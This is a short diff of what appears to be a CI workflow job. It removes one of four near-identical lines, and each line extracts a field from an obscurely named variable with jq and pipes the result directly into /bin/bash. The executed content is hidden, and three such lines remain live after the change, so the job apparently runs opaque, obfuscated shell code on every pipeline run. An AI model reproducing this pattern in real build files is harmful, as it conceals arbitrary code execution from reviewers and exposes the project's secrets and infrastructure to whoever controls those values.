@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$e33" | jq -r .cy14 | /bin/bash
           echo $mrcv5009 | jq -r .v7 | /bin/bash
-          echo $vra61342 | jq -r .nes44775 | /bin/bash
           printf '%s' "$wj2" | jq -r .by4 | /bin/bash
 
       - name: Store results
